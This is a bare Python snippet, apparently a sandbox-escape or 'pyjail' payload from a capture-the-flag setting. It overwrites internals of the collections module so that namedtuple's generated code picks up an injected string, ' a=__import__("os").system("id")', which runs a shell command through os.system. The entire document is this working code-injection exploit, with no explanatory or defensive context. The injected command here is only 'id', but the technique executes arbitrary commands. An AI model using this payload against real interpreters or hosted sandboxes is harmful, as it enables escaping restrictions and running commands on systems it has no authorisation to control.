from collections import _collections_abc, namedtuple, UserString, _itemgetter

_collections_abc.__all__ = ['repr', '_check_methods', 'isinstance']
_collections_abc.repr = UserString
_collections_abc.isinstance = _itemgetter
from collections import repr, _check_methods, isinstance

UserString.replace = _check_methods
UserString.__getattr__ = UserString

_collections_abc.NotImplemented = ' a=__import__("os").system("id")): 0 # '
namedtuple('x', 'x')

